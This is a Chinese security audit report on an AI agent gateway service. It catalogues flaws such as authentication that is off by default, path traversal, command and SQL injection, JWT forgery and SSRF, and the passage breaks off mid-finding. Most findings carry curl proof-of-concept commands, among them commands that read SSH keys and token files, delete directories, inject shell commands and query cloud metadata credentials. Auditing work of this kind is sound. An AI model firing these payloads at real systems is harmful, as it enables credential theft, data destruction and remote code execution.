# AgentAI Gateway 路由层 / 数据层严格审查报告

**审查范围**：`packages/agentai-gateway/src/app.ts`（961 行）、`src/routes/*`（50 个文件）、`src/sandbox/router.ts`、`src/middleware/auth.ts`、数据持久化层 `agent-task-store.ts` / `automation-store.ts` / `chain-store.ts` / `customer-store.ts` / `session-manager.ts` / `persistent-memory.ts` / `task-snapshot.ts`
**审查方式**：全量读码，未修改任何文件。下列问题均引用真实代码行。

---

## 总览

| 级别 | 数量 | 说明 |
|---|---|---|
| **P0** | 12 | 可直接导致 RCE / 任意文件读写删除 / 认证绕过 / 数据永久丢失 |
| **P1** | 24 | 可导致越权、信息泄漏、进程不稳定、资源耗尽 |
| **P2** | 18 | REST 规范、错误处理一致性、性能与可维护性缺陷 |

**结论先行**：这个 Gateway 的路由层在**认证默认关闭 + 路径参数零校验 + 同步阻塞 IO + JSON 全量重写**四条主线上是系统性缺陷，不是零散疏漏。`AGENTAI_AUTH_ENABLED` 默认为 `false`（`middleware/auth.ts:83`），意味着**部署后所有端点默认无鉴权**，而这些端点包含 `execSync` 命令执行、任意文件读写、任意目录删除、API Key 写入。

---

# P0 — 阻断级

## P0-1 认证中间件默认关闭，全站端点裸奔

**文件**：`src/middleware/auth.ts:82-88`（挂载点 `src/app.ts:99`）

```typescript
export function authMiddleware(req: Request, res: Response, next: NextFunction) {
  if (process.env.AGENTAI_AUTH_ENABLED !== 'true') {
    return next();
  }
  if (isWhitelisted(req)) {
    return next();
  }
```

**触发**：
```bash
curl http://127.0.0.1:18789/v1/settings/keys
curl http://127.0.0.1:18789/v1/files/read?path=C:/Users/Administrator/.ssh/id_rsa
```

**影响**：`app.ts:98` 的注释白纸黑字写着"默认 disabled"。所有 P0 级端点（check-dep 的 `execSync`、settings 写 .env、files 读写删除、git commit/push、connectors 安装依赖）在默认配置下全部无认证。监听 `0.0.0.0` 时构成完整的远程未授权访问。**这不是"配置问题"，是安全默认值错误**——安全默认值应当是 fail-closed。

---

## P0-2 白名单把两个 RCE 端点永久放行

**文件**：`src/middleware/auth.ts:68-72`

```typescript
const WHITELIST_PATHS = new Set([
  '/health',
  '/v1/system/check-dep',
  '/v1/system/auto-install',
]);
```

配合 `isWhitelisted` 仅比对 `req.path`（`auth.ts:75`），即使开启 `AGENTAI_AUTH_ENABLED=true`，这两个端点**永远免认证**。

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/system/auto-install \
  -H 'Content-Type: application/json' -d '{"dep":"playwright"}'
curl "http://127.0.0.1:18789/v1/system/check-dep?cmd=npm"
```

**影响**：`/v1/system/auto-install` 在 `app.ts:330` 与 `app.ts:364` 执行 `execSync('npm install ...')` 与 `execSync('npx playwright install chromium')`，超时 10 分钟。**未认证远程可触发 10 分钟的阻塞命令执行**，且 `app.ts:330` 之前已 `res.write()` 输出了 JSON 头（`app.ts:327-329`），使 HTTP 连接长期占用。反复调用即可挂死 Gateway。这两个是纯内部 setup 用途端点，绝不该进白名单。

---

## P0-3 `/v1/files/read` 任意文件读取（无根目录约束）

**文件**：`src/routes/files.ts:280-296`

```typescript
filesRouter.get('/v1/files/read', (req, res) => {
  const filePath = req.query.path as string;
  if (!filePath) return res.status(400).json({ error: 'path required' });
  // 读文件: 放宽限制, 允许读取任何存在的文件
  const safe = path.resolve(filePath);
  if (safe.includes('..')) return res.status(400).json({ error: 'Invalid path' });
  if (!fs.existsSync(safe)) return res.status(404).json({ error: 'file not found' });
```

**触发**：
```bash
curl "http://127.0.0.1:18789/v1/files/read?path=C:/Users/Administrator/.ssh/id_rsa"
curl "http://127.0.0.1:18789/v1/files/read?path=C:/Users/Administrator/.agentai/auth-token"
```

**影响**：`path.resolve()` 已经把 `..` 规范化掉了，所以 `safe.includes('..')` 这个检查**在 Windows 上几乎永远为 false**（`path.resolve` 消除了 `..`；即使有残留 `..`，也无法通过检查）。真正的路径约束 `sanitizePath()`（`files.ts:75-96`）**在这个端点根本没被调用** —— 只 import 了 `isPathAllowed`（`files.ts:9`）却从未使用。因此可读取进程权限范围内的任意文件，包括 SSH 私钥、`.env` 中的全部 API Key、以及 `auth-token` 文件。**注意 `files.ts:9` import 了 `isPathAllowed` 但全文没有任何调用**，说明这是遗漏而非有意设计。

---

## P0-4 `/api/files/download` 任意文件下载（0 校验）

**文件**：`src/routes/files.ts:319-355`

```typescript
filesRouter.get('/api/files/download', (req, res) => {
  const filePath = req.query.path as string;
  if (!filePath) return res.status(400).json({ error: 'path required' });
  let safe = path.resolve(filePath);
  if (!fs.existsSync(safe)) {
    const alt = path.resolve(wm.projectDir, '..', '..', path.basename(filePath));
    if (fs.existsSync(alt)) { safe = alt; }
  }
```

**触发**：
```bash
curl -o out.env "http://127.0.0.1:18789/api/files/download?path=C:/agentai-platform/.env"
```

**影响**：**整个端点没有任何路径白名单、没有 `..` 检查、没有 sanitizePath**，只有一个 50MB 大小上限（`files.ts:333`）。比 P0-3 更宽松——连 `..` 检查都没有。同时它还是唯一的文件下载端点，说明这是主下载路径。文件通过 `fs.createReadStream(safe).pipe(res)` 流式返回。

---

## P0-5 `DELETE /v1/tasks/:id` 路径穿越 → 任意目录递归删除

**文件**：`src/routes/tasks.ts:197-220` + `src/task-snapshot.ts:159,183`

```typescript
// tasks.ts:202
const taskDir = path.join(TASKS_ROOT, id);
if (!fs.existsSync(taskDir)) { return res.status(404)...; }
const result = deleteDirReliable(taskDir);
```
```typescript
// task-snapshot.ts:159
const TASKS_ROOT = path.join(os.homedir(), '.agentai', 'tasks');
// task-snapshot.ts:183
execSync(`cmd /c rmdir /s /q "${dir}"`, { stdio: 'ignore' });
```

**触发**：
```bash
curl -X DELETE "http://127.0.0.1:18789/v1/tasks/..%2f..%2f..%2fDocuments"
```

**影响**：`:id` 路径参数**没有任何格式校验**。`path.join(TASKS_ROOT, '../../..')` 会解析到 `.agentai` 的父目录。`deleteDirReliable` 三级回退最终执行 `cmd /c rmdir /s /q`，**递归删除任意目录且不可恢复**。`..%2f` 的 URL 编码可以绕过 Express 路由对 `/` 的切分。同一问题存在于 `task-snapshot.ts:216`（`getTaskDir`）、`:620`、`:684`、`:898`，即 `loadTaskSnapshot` / `markTaskStatus` 也可被穿越读取和写入。

---

## P0-6 `/v1/files` 树形浏览与 `/v1/fs/list` 任意目录遍历

**文件**：`src/routes/files.ts:210-227`、`files.ts:169-207`

```typescript
// files.ts:213-217
const workspace = (req.query.workspace as string) || (req.query.path as string) || process.cwd();
const resolved = path.resolve(workspace);
// 文件树浏览: 放宽限制, 允许浏览任何存在的目录
if (resolved.includes('..')) { return res.status(400)... }
if (!fs.existsSync(resolved)) { return res.json({ tree: [], ... }); }
const tree = buildTree(resolved, '', 5);
```

**触发**：
```bash
curl "http://127.0.0.1:18789/v1/files?workspace=C:/Users/Administrator/.ssh"
curl "http://127.0.0.1:18789/v1/fs/list?dir=C:/Users/Administrator"
```

**影响**：与 P0-3 同病——`path.resolve()` 后 `..` 已被消除，检查无效。`buildTree` 递归 5 层、每层 100 项（`files.ts:109,222`），可一次性枚举整个磁盘目录结构。注释"放宽限制, 允许浏览任何存在的目录"说明是**刻意的设计选择**，但这个选择在无鉴权前提下（见 P0-1）等于开放全盘索引。

---

## P0-7 `POST /v1/fs/reveal` 命令注入

**文件**：`src/routes/files.ts:373-393`

```typescript
filesRouter.post('/v1/fs/reveal', (req, res) => {
  const { path: filePath } = req.body || {};
  const safe = sanitizePath(filePath);
  ...
  exec(`explorer /select,"${safe.replace(/\//g, '\\')}"`);
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/fs/reveal \
  -H 'Content-Type: application/json' \
  -d '{"path":"C:/x\" & calc.exe & \""}'
```

**影响**：`safe` 被插入 `exec()` 的 shell 命令字符串。虽然 `sanitizePath` 会校验路径是否在允许根内，但**路径内的引号未转义**。`safe` 中若含 `"` 即可闭合 `explorer /select,"` 并注入命令。注意 `sanitizePath` 的允许根包含用户主目录（`files.ts:26-29`），因此攻击者有充分的构造空间。另外 `files.ts:380` 在 ESM 模块（`package.json` 中 `"type": "module"`）里使用 `require('child_process')`，依赖 `app.ts` 之外的环境；此行在纯 ESM 下会抛 `ReferenceError: require is not defined`（被 catch 吞掉返回 400）。

---

## P0-8 `auth.ts` JWT 使用硬编码默认密钥 + 无签名算法校验 + 无过期

**文件**：`src/routes/auth.ts:52-71`

```typescript
function generateToken(userId: string): string {
  const payload = Buffer.from(JSON.stringify({ userId, iat: Date.now() })).toString('base64');
  const signature = crypto.createHmac('sha256', process.env.JWT_SECRET || 'agentai-default-secret')
    .update(payload).digest('hex');
  return `${payload}.${signature}`;
}

function verifyToken(token: string): string | null {
  const [payload, signature] = token.split('.');
  const expected = crypto.createHmac('sha256', process.env.JWT_SECRET || 'agentai-default-secret')
    .update(payload).digest('hex');
  if (signature !== expected) return null;
  const { userId } = JSON.parse(Buffer.from(payload, 'base64').toString());
  return userId;
}
```

**触发**（无需任何密钥，5 行代码伪造任意用户）：
```bash
# payload = base64({"userId":"admin","iat":0})
curl -X POST http://127.0.0.1:18789/v1/auth/login \
  -H 'Content-Type: application/json' -d '{"username":"admin","password":"x"}'   # 先注册
# 然后本地计算 HMAC-SHA256("eyJ1c2VySWQiOiJhZG1pbiIsImlhdCI6MH0", "agentai-default-secret")
curl http://127.0.0.1:18789/v1/subscription/status \
  -H "Authorization: Bearer <forged>.<sig>"
```

**影响**：三重缺陷叠加：
1. `JWT_SECRET` 未设时退化为公开的硬编码字符串 `agentai-default-secret`（`auth.ts:54`、`auth.ts:64`，`subscription.ts:46` 同样）→ 任何人都能伪造任意用户的 token。
2. `token.split('.')` 后**签名与 payload 的绑定关系错误**：签名只覆盖 payload，攻击者无法篡改 payload（这点是对的），但因为密钥已知，攻击者可**自由构造任意 payload**。
3. token 无 `exp`、无 `nbf`，签发后**永久有效**，无法吊销。

`/v1/auth/logout`（`auth.ts:193-195`）只返回 `{ok:true}`，不做任何服务端失效处理，所以"登出"是纯前端行为。

---

## P0-9 `/v1/settings/keys` 把任意 API Key 写入 `.env` + 运行时 `process.env`

**文件**：`src/routes/settings.ts:147-171`

```typescript
r.post('/v1/settings/keys', (req: Request, res: Response) => {
  const { provider, apiKey } = req.body || {};
  if (!provider || !apiKey) { return res.status(400)... }
  const envVar = ENV_KEY_MAP[provider] || `${provider.toUpperCase()}_API_KEY`;
  writeEnvKey(envVar, apiKey);
  process.env[envVar] = apiKey;
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/settings/keys \
  -H 'Content-Type: application/json' -d '{"provider":"anthropic","apiKey":"sk-ant-ATTACKER_KEY"}'
curl -X DELETE http://127.0.0.1:18789/v1/settings/keys \
  -H 'Content-Type: application/json' -d '{"provider":"deepseek"}'
```

**影响**：
- `provider` 无枚举校验，`:107`/`:153`/`:184` 的 fallback `${provider.toUpperCase()}_API_KEY` 允许写入**任意环境变量名**。例如 `provider: "path"` → 写入 `PATH=...`；`provider: "node_options"` → 写入 `NODE_OPTIONS`，可注入 `--require` 实现 RCE。
- `apiKey` 无长度/字符校验，可写入换行符 → 向 `.env` 注入任意额外变量。
- `DELETE` 版本可**删除任意已存在的环境变量**（`settings.ts:190` `delete process.env[envVar]`），包括 `PATH`，导致进程后续所有子进程 spawn 失败。
- 无鉴权（叠加 P0-1）。

---

## P0-10 `agent-task-store` 的 `update()` 写不存在的列 → 所有 PATCH 必失败

**文件**：`src/agent-task-store.ts:175-179`

```typescript
updates.push('updated_at = ?');
values.push(Date.now());
values.push(id);

this.db.prepare(`UPDATE agent_tasks SET ${updates.join(', ')} WHERE id = ?`).run(...values);
```

**触发**：
```bash
curl -X PATCH http://127.0.0.1:18789/v1/agent-tasks/task_123 \
  -H 'Content-Type: application/json' -d '{"status":"running"}'
```

**影响**：建表 DDL（`agent-task-store.ts:73-88`）**没有 `updated_at` 列**，但 `update()` 无条件 `SET updated_at = ?`。better-sqlite3 会抛 `SqliteError: no such column: updated_at`，被 `agent-tasks.ts:151-153` 的 catch 捕获后返回 **500 + `error: "no such column: updated_at"`**。

这意味着**整个任务板的状态更新功能完全不可用**——`completeWithNextSteps`（`agent-task-store.ts:231`）、`failWithHint`（`:253`）、以及 chat 流程中所有任务状态流转全部失效。这是代码层面的确定性 bug，非边界情况。

---

## P0-11 `PATCH /v1/agent-tasks/:id` 把整个 `req.body` 当 SQL 列名 → SQL 注入

**文件**：`src/routes/agent-tasks.ts:141-154` + `src/agent-task-store.ts:157-169`

```typescript
// agent-tasks.ts:145 — 直接透传，无白名单
const task = store.update(req.params.id, req.body);
```
```typescript
// agent-task-store.ts:157-168
for (const [key, val] of Object.entries(patch)) {
  if (val === undefined || val === null) continue;
  if (key === 'tags') { updates.push('tags = ?'); values.push(JSON.stringify(val)); }
  else if (key === 'description' || ...) { updates.push(`${key} = ?`); values.push(val); }
  else { updates.push(`${key} = ?`); values.push(val); }   // ← key 直接拼进 SQL
}
...
this.db.prepare(`UPDATE agent_tasks SET ${updates.join(', ')} WHERE id = ?`).run(...values);
```

**触发**：
```bash
curl -X PATCH http://127.0.0.1:18789/v1/agent-tasks/task_1 \
  -H 'Content-Type: application/json' \
  -d '{"status":"done","title = ''x'', result = (SELECT password FROM users LIMIT 1) WHERE id = ''task_1'' --":"y"}'
```

**影响**：JSON 的 key 被**直接字符串拼接进 SQL 语句**，没有任何标识符校验或转义（`prepare()` 只绑定 values，不绑定列名）。任意列名注入 → 可注入任意 SQL 表达式。虽然 `updated_at` 的 bug（ P0-10）会让请求先抛错，但两处缺陷在同一函数中，修复 P0-10 后 P0-11 立即可利用。

---

## P0-12 `automation-store` 用 `sql.js` 内存态 + 每次操作全量重写文件，无锁无事务

**文件**：`src/automation-store.ts:141-145`

```typescript
function persistDb(inst: any): void {
  const dbPath = path.join(os.homedir(), '.agentai', 'automations.db');
  fs.mkdirSync(path.dirname(dbPath), { recursive: true });
  fs.writeFileSync(dbPath, Buffer.from(inst.export()));
}
```

被 `create`（`:265`）、`update`（`:325`）、`delete`（`:339`）无条件调用。

**触发**：并发 `POST /v1/automation/cron`（`app.ts:625` 挂载的 `createAutomationRouter` 走的是 `automation-engine.ts`；但 automation-store 由 `startBackgroundJobs` 在 `app.ts:871-874` 初始化并 `resumeAll`，与 API 层并发）。
```bash
for i in $(seq 1 20); do
  curl -s -X POST http://127.0.0.1:18789/v1/automation/crons -d '{}' &
done; wait
```

**影响**：
1. **无文件锁的 `writeFileSync` 全量覆盖**：`Buffer.from(inst.export())` 是在内存里导出整个 DB 再整体覆写。两个并发写（A 完成读、B 完成写、A 落盘）**后写覆盖先写，丢数据**。
2. **非原子写**：没有 tmp+rename（对比 `customer-store.ts:106-108` 正确使用了 tmp+rename）。写到一半进程崩溃 → `automations.db` **彻底损坏**，且 `ensureDb`（`:105-108`）下次启动读损坏文件会抛，整个 automation 系统永久不可用。
3. **同步阻塞**：`writeFileSync` + `inst.export()` 在请求路径上，DB 越大阻塞越久。

---

# P1 — 高危

## P1-1 `/v1/agent-tasks/:id` 无归属校验（IDOR）

**文件**：`src/routes/agent-tasks.ts:157-167`

```typescript
r.delete('/:id', (req: Request, res: Response) => {
  const workspace = (req.body.workspace as string) || process.cwd();
  const store = getStore(workspace);
  store['db'].prepare('DELETE FROM agent_tasks WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});
```

**触发**：`curl -X DELETE http://127.0.0.1:18789/v1/agent-tasks/<别人的任务id>`

**影响**：SQL 里**只有 `id`，没有 `workspace` 过滤**。`workspace` 变量读了但只用于 `getStore()` 选实例，**根本没进 WHERE 子句**。任意用户可删任意任务。同理 `PATCH`（`:141-154`）的 `store.update(id, req.body)` → `get(id)`（`agent-task-store.ts:186`）也只按 id 查，无归属校验。

---

## P1-2 会话/记忆接口无归属校验，跨用户读写

**文件**：`src/routes/sessions.ts:69-79, 84-91, 96-103`

```typescript
router.get('/:id', (req, res) => {
  const { id } = req.params;
  const cp = pm.getCheckpoint(id);
  if (!cp) return res.status(404).json({...});
  res.json({ success: true, checkpoint: cp });
});
```

**触发**：
```bash
curl http://127.0.0.1:18789/api/sessions/<别人的sessionId>
curl http://127.0.0.1:18789/api/sessions/<别人的sessionId>/messages   # 拿到完整对话历史
curl -X DELETE http://127.0.0.1:18789/api/sessions/<别人的sessionId>      # 删掉
```

**影响**：`:id` 完全来自 URL，无任何 userId 归属校验。而 checkpoint 里含 `workspace`（绝对路径，可能含用户名）和**全部对话消息**（`persistent-memory.ts:170-178` 的 `SessionCheckpoint.messages`）。`GET /api/sessions`（`sessions.ts:33-42`）更直接——`pm.listCheckpoints()` **返回所有用户的全部会话**，无条件过滤。

---

## P1-3 `/v1/tasks` 系列接口无归属校验

**文件**：`src/routes/tasks.ts:94-107, 113-137, 144-163`

```typescript
r.get('/:id', (req, res) => {
  const { id } = req.params;
  if (!id) return res.status(400)...;
  const snap = loadTaskSnapshot(id);
```

**触发**：
```bash
curl http://127.0.0.1:18789/v1/tasks/<taskId>              # 读 snapshot（含完整 goal/contextSummary/workspace 绝对路径）
curl -X POST http://127.0.0.1:18789/v1/tasks/<taskId>/status -d '{"status":"completed"}'   # 篡改他人任务状态
```

**影响**：`listAllTasks`（`task-snapshot.ts:603-612`）支持 `userId` 过滤参数，但**路由层默认不传**（`tasks.ts:44` `listAllTasks({ userId, status, workspace })`，`userId` 来自 `req.query`）。`userId` 可被**省略**（→ 列出全部）或**任意伪造**（→ 列出他人）。任务 snapshot 含长任务执行上下文与文件路径。

---

## P1-4 `GET /v1/evolution/list` 与 `DELETE /v1/evolution/rules/:id` 无上限 / 数组下标删除

**文件**：`src/app.ts:389-398` 与 `app.ts:428-446`

```typescript
// app.ts:392
const limit = parseInt(req.query.limit as string) || 50;
const entries = readEvolution(limit);
```
```typescript
// app.ts:438-441
const rules = JSON.parse(fs.readFileSync(rulesFile, 'utf-8'));
const ruleId = parseInt(req.params.id);
const filtered = Array.isArray(rules) ? rules.filter((_ : any, i: number) => i !== ruleId) : [];
fs.writeFileSync(rulesFile, JSON.stringify(filtered, null, 2), 'utf-8');
```

**触发**：
```bash
curl "http://127.0.0.1:18789/v1/evolution/list?limit=999999999"
curl -X DELETE "http://127.0.0.1:18789/v1/evolution/rules/0"    # 按数组下标删，不是业务 id
```

**影响**：
1. `limit` **无上限校验**，`?limit=999999999` 直接传给 `readEvolution`，全量读文件 + 全量序列化。同类问题在 `app.ts:451`（`/v1/notifications/history` 的 limit）、`app.ts:569`（`/v1/workflows/executions`）均存在。
2. `DELETE /rules/:id` 的语义是**按数组下标过滤**，不是按规则 id。前端展示的 id 若与数组下标不一致，会删错规则；且**无二次确认**，一次误调即永久删除（无备份、无软删除）。
3. `readFileSync` + `writeFileSync` 在请求路径同步阻塞（`app.ts:421`、`app.ts:438`、`app.ts:441`）。

---

## P1-5 `POST /v1/feature-flags` 无鉴权改灰度开关

**文件**：`src/app.ts:726-735`

```typescript
app.post('/v1/feature-flags', async (req, res) => {
  const flags = await getFF();
  const { useNewModelSelector, enableDiagnosisPipeline, newModelSelectorTrafficPercent } = req.body;
  if (typeof useNewModelSelector === 'boolean') flags.useNewModelSelector = useNewModelSelector;
  ...
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/feature-flags \
  -H 'Content-Type: application/json' -d '{"useNewModelSelector":false,"newModelSelectorTrafficPercent":100}'
```

**影响**：唯一的风险控制手段是 feature flag，而它本身**无鉴权、可被任意请求修改**。`newModelSelectorTrafficPercent` 无范围校验（只判断 `typeof === 'number'`），可设为 `-1` 或 `1e9`。关闭 `useNewModelSelector` 会直接影响 `chat.ts:580` 的灰度判定路径。

---

## P1-6 SSE 端点在客户端断连后泄漏 loop 监听器

**文件**：`src/routes/chat.ts:812-953`（约 22 个 `loop.on`）对比 `chat.ts:1236-1237`

```typescript
// 注册（每次请求）
loop.on('llm:delta', ...);       // :812
loop.on('llm:thinking', ...);    // :816
loop.on('subagent:start', ...);  // :820
loop.on('tool:start', ...);      // :833
... 共约 22 个
loop.on('memory:auto-captured', ...)  // :951

// 注销（仅 2 个，且其中一个注销的事件名是错的）
loop.off('tool:start', onToolStart);   // :1236
loop.off('tool:end', onToolEnd);       // :1237  ← 注册的是 'tool:result'，不是 'tool:end'
```

**触发**：同一 session 连续发起 N 次流式对话：
```bash
for i in $(seq 1 50); do
  curl -s -N -X POST http://127.0.0.1:18789/v1/chat \
    -H 'Content-Type: application/json' \
    -d '{"message":"hi","userId":"u1","workspace":"C:/tmp","stream":true}' &
done
```

**影响**：
1. **`loop` 对象被 sessionManager 复用**（`chat.ts:1376` `sessionData.loop`），因此监听器**跨请求累积**。50 次请求后同一个 loop 上挂着 50 份 `llm:delta` 回调 → 单次 delta 事件触发 50 次 `res.write`，其中 49 次写到已销毁的 res。
2. `chat.ts:1237` 的 `loop.off('tool:end', onToolEnd)` **事件名不匹配**（注册时是 `chat.ts:1198` 的 `loop.on('tool:result', onToolEnd)`），所以这个监听器**永远注销不掉**。
3. 所有回调闭包都持有 `res` 引用 → **res 对象无法被 GC** → 内存泄漏随请求数线性增长。
4. `chat.ts:1236-1237` 位于 `if (loopAborted)` 早退（`:1229-1233`）**之后**，所以中断路径下这些 off 全部跳过，泄漏更严重。
5. `chat.ts:1237` 之后的 `master` 分支（`:1092-1094`）用 try/finally 正确清理了，对比之下 loop 分支的缺失更像是疏漏。

---

## P1-7 `agent-tasks` SSE 无并发连接上限，无心跳，可无限堆积监听器

**文件**：`src/routes/agent-tasks.ts:170-177` + `src/agent-task-store.ts:291-321`

```typescript
r.get('/stream', (req, res) => {
  const workspace = (req.query.workspace as string) || process.cwd();
  createAgentTaskStream(res, workspace);
});
```
```typescript
// agent-task-store.ts:303-318
const handlers = [['task:created', ...], ['task:updated', ...], ['task:completed', ...], ['task:failed', ...]] as const;
for (const [event, handler] of handlers) { store.on(event, handler); }
res.on('close', () => {
  for (const [event, handler] of handlers) { store.off(event, handler); }
});
```

**触发**：
```bash
for i in $(seq 1 1000); do
  curl -s -N "http://127.0.0.1:18789/v1/agent-tasks/stream?workspace=C:/tmp" &
done
```

**影响**：
1. **无连接数上限**，1000 个 SSE 连接 → store 上挂 4000 个监听器。每次任务更新触发 1000 次 `res.write`。
2. **无 keep-alive 心跳**（对比 `chat.ts:458-460` 的 5 秒心跳），代理/防火墙会静默断连。
3. **依赖 `res.on('close')` 清理**（`agent-task-store.ts:314`）——若 `close` 未触发（异常情况），监听器**永久泄漏**在全局单例 store 上（`agent-task-store.ts:45` `_instance`）。
4. `res.write` 无 try/catch（`agent-task-store.ts:298-301`），对已断开的 res 写入可能抛未捕获异常。

---

## P1-8 `/v1/browser/proxy` SSRF + 主动剥离安全头

**文件**：`src/routes/browser.ts:129-144`

```typescript
const baseTag = `<base href="${targetUrl}">`;
if (/<head[^>]*>/i.test(body)) {
  body = body.replace(/<head([^>]*)>/i, `<head$1>${baseTag}`);
}
...
// 移除限制嵌入的 meta 标签
body = body.replace(/<meta[^>]*http-equiv=["']?content-security-policy["']?[^>]*>/gi, '');
// 设置响应头: 允许嵌入
res.setHeader('Access-Control-Allow-Origin', '*');
// 不转发 X-Frame-Options 和 CSP
res.send(body);
```

**触发**：
```bash
curl "http://127.0.0.1:18789/v1/browser/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://127.0.0.1:18789/v1/browser/proxy?url=file:///C:/Users/Administrator/.ssh/id_rsa"
curl "http://127.0.0.1:18789/v1/browser/proxy?url=http://localhost:18789/v1/settings/keys"
```

**影响**：
1. **SSRF**：只校验 `protocol` 是 `http:`/`https:`（`browser.ts:113`），**无内网 IP 黑名单**。可探测云元数据服务（`169.254.169.254`）、本地 Gateway 自身、以及任何内网服务。
2. `redirect: 'follow'`（`browser.ts:124`）会自动跟随 302，可用于绕过协议校验（先给一个 302 到 `file://` 的 URL）。
3. **主动剥离 CSP + 不转发 X-Frame-Options + 设 `ACAO: *`** —— 这等于一个开放的网页代理框架。配合 `base` 标签注入（`baseTag` 未转义 `"`，可注入 `"><script>`），可构造存储型 XSS。
4. `POST /v1/browser/scan`（`browser.ts:184-256`）有同样的 SSRF 问题，且会**启动 Playwright 引擎导航到目标 URL**（`browser.ts:205-211`），危害更大。

---

## P1-9 `/v1/git/add` 命令参数注入

**文件**：`src/routes/git-simple.ts:145-155` + `:27-34`

```typescript
router.post('/add', (req: any, res: any) => {
  const cwd = getWorkspace(req);
  const { files } = req.body;
  execGit(['add', ...files], cwd);
```
```typescript
function execGit(args: string[], cwd: string, timeout = 10000) {
  const out = execSync(`git ${args.join(' ')}`, { cwd, encoding: 'utf-8', ... }).trim();
```

**触发**：
```bash
curl -X POST http://127.0.0.1:18789/v1/git/add \
  -H 'Content-Type: application/json' -d '{"files":["-A","--upload-pack=touch /tmp/pwned"]}'
```

**影响**：`files` 数组**无校验、无引号转义**，直接 `join(' ')` 拼进 shell 命令。`git add --upload-pack=<cmd>` 是经典的 git RCE 向量。同类问题在 `/commit`（`:163`，`message` 无校验，`git commit -m <msg>` 可注入 `--author` 等 flag）和 `/push`（`:183`，`remote`/`branch` 无校验）。`getWorkspace`（`:37-39`）还允许**通过 header `x-workspace-path` 指定任意 cwd**，等于可在任意仓库执行 git 写操作。

---

## P1-10 `customer-store` 的 `updateCustomer` 可覆盖 `customerId` 与 `createdAt`

**文件**：`src/routes/customer.ts:111-117` + `src/customer-store.ts:166-174`

```typescript
// customer.ts:114 — 整个 req.body 作为 updates
const updated = store.updateCustomer(id, req.body || {});
```
```typescript
// customer-store.ts:170
const updated = { ...existing, ...updates, updatedAt: Date.now() };
```

**触发**：
```bash
curl -X PUT http://127.0.0.1:18789/v1/customers/cust-123 \
  -H 'Content-Type: application/json' -d '{"customerId":"cust-evil","contactCount":99999}'
```

**影响**：`updates` 直接展开进 `updated`，**只强制覆盖 `updatedAt`**。`customerId` 可被改写 → Map key（`:171 cache.set(customerId, updated)`）与对象内部 `customerId` 不一致，后续所有 `getCustomer(cust-123)` 都失效，数据在缓存里变成孤儿记录。`contactCount` 可任意伪造。同类问题在 `POST /v1/customers`（`:88-98`），`channels`/`tags` 无类型校验，可传对象而非数组，后续 `.some()`/`.join()` 会抛异常。

---

## P1-11 `customer-store` 的 `persistAll` 存在 lost-update 竞态

**文件**：`src/customer-store.ts:101-109`

```typescript
function persistAll(): void {
  ensureDir();
  const cache = loadCache();
  const lines = Array.from(cache.values()).map(c => JSON.stringify(c));
  const tmp = CUSTOMERS_FILE + '.tmp';
  fs.writeFileSync(tmp, lines.join('\n') + '\n', 'utf-8');
  fs.renameSync(tmp, CUSTOMERS_FILE);
}
```

**触发**：
```bash
for i in $(seq 1 50); do
  curl -s -X POST http://127.0.0.1:18789/v1/customers \
    -H 'Content-Type: application/json' -d "{\"name\":\"c$i\"}" &
done; wait
```

**影响**：
1. **tmp 文件名是固定的** `customers.jsonl.tmp`。50 个并发请求全部 `writeFileSync` 到**同一个 tmp 路径**再 rename → 后写覆盖先写，**丢客户数据**。这是 `automation-store` P0-12 的同类 bug，但因 tmp 路径固定而更容易触发（无需跨进程，只需并发）。
2. **全量重写整个文件**：1000 个客户 = 每次创建都重写 1000 行 JSON。`addJourneyEvent`（`:261-280`）每次追加事件触发 2 次全量重写（一次 journey append + 一次 `updateCustomer`→`persistAll`）。`recordMessage`（`:302-328`）在消息回调路径上，等于**每条聊天消息触发一次全量文件重写**。
3. `loadCache()`（`:83-99`）在进程内永不过期（`_customersCache` 只在首次加载），外部修改文件不可见。

---

## P1-12 `readMemory` 的 `limit` 硬编码 9999

**文件**：`src/routes/sessions.ts:132-146`

```typescript
memoryRouter.get('/stats', async (req, res) => {
  const projectMems = workspace ? await readMemory({ userId, workspace, limit: 9999 }) : [];
  const userMems = await readMemory({ userId, limit: 9999 });
```

**触发**：`curl "http://127.0.0.1:18789/api/memory/stats?userId=any&workspace=/"`

**影响**：无上限的深度读取，且 `userId` / `workspace` **全部来自 query 无归属校验**。若 memory 存储有十万级条目，每次调用都是全量读 + 全量 length 计算，且该端点被 GUI 面板高频轮询。对比 `sessions.ts:160` 的 `auto-captured` 端点有 `Math.min(..., 200)` 上限——同一文件内两个端点标准不一致。

---

## P1-13 `automation-store.list()` 的 fallback 路径丢失过滤条件

**文件**：`src/automation-store.ts:283-313`

```typescript
async list(filter?: { status?: AutomationStatus; userId?: string }): Promise<AutomationRecord[]> {
  ...
  let sql = 'SELECT * FROM automations';
  const conditions: string[] = [];
  if (filter?.status) { conditions.push('status = ?'); params.push(filter.status); }
  if (filter?.userId) { conditions.push('user_id = ?'); params.push(filter.userId); }
  if (conditions.length) sql += ' WHERE ' + conditions.join(' AND ');
  try {
    const stmt = inst.prepare(sql);
    if (params.length > 0) stmt.bind(params);
    ...
  } catch {
    // fallback: 无条件查询用 exec
    const result = inst.exec(sql);
```

**影响**：两个问题：
1. **fallback 路径 `inst.exec(sql)` 用了带 `?` 占位符的 SQL 但没绑定 params** → sql.js 会抛错或返回错误结果，`conditions` 彻底失效，退化为**返回全部记录**。任何过滤失效都是数据泄漏。
2. `resumeAll`（`:386-408`）依赖 `list({ status: 'ACTIVE' })` 的过滤来恢复任务。若 fallback 触发，**会尝试恢复 PAUSED 的任务** → 停用的自动化任务被意外重启。

---

## P1-14 错误信息把内部路径 / 堆栈泄漏给客户端

**文件**：多点

```typescript
// app.ts:766
res.status(500).json({ error: err.message || 'Internal Server Error' });
// files.ts:205, 225, 246, 294, 354
res.status(400).json({ error: String(e) });     // String(e) = "Error: ENOENT: no such file or directory, open 'C:\Users\...\secret.env'"
// files.ts:295 (read)
res.status(400).json({ error: String(e) });     // 含完整本机绝对路径
// browser.ts:150, 254
res.status(502).json({ error: err.message || 'proxy failed' });   // fetch 失败信息含目标 URL
// settings.ts:169
